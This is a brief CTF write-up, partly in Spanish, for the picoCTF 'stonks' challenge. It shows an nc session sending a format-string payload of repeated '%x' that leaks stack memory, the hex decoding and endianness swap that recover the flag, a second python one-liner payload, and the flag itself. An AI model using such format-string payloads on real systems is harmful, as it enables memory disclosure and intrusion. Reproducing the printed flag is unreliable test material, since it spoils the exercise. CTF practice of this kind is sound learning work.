

```
┌──(kali㉿kali)-[~/picoctf/pwning/stonks]
└─$ (echo 1; echo "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x") | nc mercury.picoctf.net 59616
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
95c0470804b00080489c3f7ef9d80ffffffff195be160f7f07110f7ef9dc7095bf180195c045095c04706f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3834313634356562ffa5007df7f34af8f7f074408fb83e0010f7d96ce9f7f080c0f7ef95c0f7ef9000ffa5f698f7d8768df7ef95c08048ecaffa5f6a40f7f1bf09
Portfolio as of Wed May 10 17:09:20 UTC 202
```

- Convertimos hex to ascii
https://www.rapidtables.com/convert/number/hex-to-ascii.html

pocip{FTC0l_I4_t5m_ll0m_y_y3n841645ebÿ¥ }

- invertimos con cybercheff  * *
swap endianess / raw / 4

## flag

picoCTF{I_l05t_4ll_my_m0n3y_6148be54}

## way 2
```
nc mercury.picoctf.net 27912 <<< 1 <<< $(python3 -c "print('%x'*24)")
```


- Referencias
https://www.youtube.com/watch?v=ctpQdH-GGqY